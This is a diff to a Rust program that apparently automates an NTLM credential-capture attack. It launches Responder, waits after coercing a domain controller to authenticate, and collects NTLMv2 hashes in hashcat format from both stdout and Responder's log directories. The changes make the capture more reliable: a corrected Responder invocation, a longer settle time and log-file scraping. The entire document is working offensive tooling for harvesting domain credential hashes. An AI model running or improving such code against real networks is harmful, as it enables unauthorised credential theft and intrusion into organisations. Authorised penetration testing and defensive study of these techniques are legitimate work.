@@ -259,9 +259,13 @@ async fn spawn_responder(
 ) -> std::result::Result<ResponderHandle, String> {
     use tokio::io::AsyncBufReadExt;
     let mut cmd = tokio::process::Command::new("responder");
+    // Minimal invocation — `-I <iface>` is enough to start the SMB listener
+    // with Responder's default config; hashes land on stdout AND in
+    // /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt. The previous `-wd`
+    // wasn't a valid combined-form on all Responder builds and silently
+    // dropped Responder into a no-listener mode on some Kali rolls.
     cmd.arg("-I")
         .arg(interface)
-        .arg("-wd")
         .stdin(Stdio::null())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
@@ -337,6 +341,63 @@ async fn spawn_responder(
     }
 }
 
+/// Read freshly-written `SMB-NTLMv2-SSP-*.txt` files from Responder's log
+/// directory and return any hash lines found. Responder writes the hash
+/// verbatim — one line per capture in the canonical hashcat netntlmv2
+/// format. We restrict to files modified within the last 60s so prior-op
+/// hashes don't pollute the result.
+///
+/// This is the authoritative source: stdout capture races against process
+/// teardown and on some Kali rolls Responder buffers stdout so heavily
+/// that we never see the line before SIGKILL. The on-disk file is written
+/// synchronously inside Responder's hash-capture path.
+async fn scrape_responder_log_dir() -> Vec<String> {
+    use std::time::SystemTime;
+    let log_dirs = [
+        "/usr/share/responder/logs",
+        "/var/lib/responder/logs",
+        "/opt/responder/logs",
+    ];
+    let mut out: Vec<String> = Vec::new();
+    let cutoff = SystemTime::now()
+        .checked_sub(Duration::from_secs(60))
+        .unwrap_or(SystemTime::UNIX_EPOCH);
+    for dir in &log_dirs {
+        let Ok(mut rd) = tokio::fs::read_dir(dir).await else {
+            continue;
+        };
+        while let Ok(Some(entry)) = rd.next_entry().await {
+            let name = entry.file_name();
+            let name_str = name.to_string_lossy();
+            // Both SMB-NTLMv2-SSP-*.txt (modern) and SMB-NTLMv2-*.txt are
+            // shapes Responder has used over releases.
+            if !(name_str.starts_with("SMB-NTLMv2") && name_str.ends_with(".txt")) {
+                continue;
+            }
+            if let Ok(meta) = entry.metadata().await {
+                if let Ok(mtime) = meta.modified() {
+                    if mtime < cutoff {
+                        continue;
+                    }
+                }
+            }
+            let Ok(text) = tokio::fs::read_to_string(entry.path()).await else {
+                continue;
+            };
+            for line in text.lines() {
+                let trimmed = line.trim();
+                if trimmed.contains("::")
+                    && !trimmed.is_empty()
+                    && !out.iter().any(|h| h == trimmed)
+                {
+                    out.push(trimmed.to_string());
+                }
+            }
+        }
+    }
+    out
+}
+
 /// Pull NTLMv1/NTLMv2 hash lines out of a Responder stdout dump. Responder
 /// prints them as `[SMB] NTLMv2-SSP Hash : <user>::<domain>:...` (with
 /// `NTLMv1-SSP` / `NTLMv1` / `NTLMv2` variants depending on what the client
@@ -409,15 +470,26 @@ where
 
     let coerce_result = coerce().await;
 
-    // Brief settle so Responder catches retransmits the DC sends after the
-    // coerce subprocess exits — 5s covers typical Windows SMB session-setup
-    // retry behavior.
-    sleep(Duration::from_secs(5)).await;
+    // Settle so Responder catches retransmits the DC sends after the
+    // coerce subprocess exits — 15s covers Windows SMB session-setup retry
+    // behavior (3 retries × ~5s) plus the DC's NTLM response time.
+    sleep(Duration::from_secs(15)).await;
 
     let responder_dump = responder.captured_output().await;
     drop(responder); // SIGKILL, release 445
 
-    let hashes = extract_responder_hashes(&responder_dump);
+    // Two sources for captured hashes:
+    //  1. Responder stdout (in-memory, captured during run).
+    //  2. /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt — authoritative;
+    //     Responder writes hashes to disk even when stdout is buffered or
+    //     swallowed by the parent (we've seen this on some Kali rolls).
+    // Merge both, dedup by exact hash line.
+    let mut hashes = extract_responder_hashes(&responder_dump);
+    for fs_hash in scrape_responder_log_dir().await {
+        if !hashes.iter().any(|h| h == &fs_hash) {
+            hashes.push(fs_hash);
+        }
+    }
     let mut combined = match coerce_result {
         Ok(out) => out,
         Err(e) => ToolOutput {
